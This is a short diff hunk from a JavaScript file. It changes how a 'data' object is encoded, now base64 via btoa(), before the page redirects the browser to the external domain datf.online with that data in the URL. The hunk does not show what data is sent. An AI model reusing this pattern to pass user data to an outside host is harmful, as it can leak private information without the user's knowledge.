@@ -13,7 +13,7 @@
         }
 
         // Step 2: Encode data as a JSON string
-        let encodedData = encodeURIComponent(JSON.stringify(data));
+        let encodedData = btoa(encodeURIComponent(JSON.stringify(data)));
 
         // Step 3: Redirect to domain2 with the data as a query parameter
         window.location.href = "https://datf.online?data=" + encodedData;
